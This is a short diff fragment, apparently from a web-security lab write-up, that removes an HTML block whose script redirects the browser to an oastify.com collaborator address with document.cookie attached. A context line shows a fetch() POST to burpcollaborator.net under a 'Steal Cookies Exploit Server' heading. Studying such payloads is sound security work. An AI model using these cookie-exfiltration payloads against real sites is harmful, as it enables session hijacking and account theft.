@@ -22,15 +22,6 @@ fetch(`https://burpcollaborator.net`, {method: ‘POST’,mode: ‘no-cors’,bo
 </html>
 ```
 
-```html
-<html>
-  <body>
-    <script>
-       location=`https://job2qmtyiktp38qrojz8w5p5rwxnlo9d.oastify.com/?c=${document.cookie}`
-    </script>
-  </body>
-</html>
-```
 
 >Steal Cookies Exploit Server:  
 
